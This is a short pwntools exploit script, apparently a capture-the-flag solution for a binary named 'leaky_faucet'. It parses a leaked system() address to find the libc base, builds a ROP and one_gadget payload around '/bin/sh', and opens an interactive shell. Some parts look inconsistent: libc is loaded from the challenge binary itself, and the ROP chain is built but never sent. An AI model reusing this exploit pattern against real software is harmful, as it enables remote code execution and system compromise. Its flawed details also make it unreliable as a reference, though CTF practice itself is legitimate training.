#!/usr/bin/python3

from pwn import *

exe = ELF('leaky_faucet', checksec=False)
libc = ELF('leaky_faucet', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()
p.recvuntil(b"drip..\n")
system_leak = int(p.recvuntil(b"\n").strip(), 16)
libc.address = system_leak - libc.sym.system

print(f"{hex(libc.address)=}")

gadgets = [0x4f3fc, 0x4f403, 0xdb313]

rop = ROP(libc)
rop.rdi = next(libc.search(b"/bin/sh\x00"))
rop.raw(libc.address + gadgets[2])
print(rop.dump())

payload = flat(
    b"/bin/sh\x00" + b"\x00"*0x18 +
    p64(libc.symbols["environ"]) +
    p64(libc.address + gadgets[2])
)

p.sendlineafter(b"drip..\n\n", payload)


p.interactive()
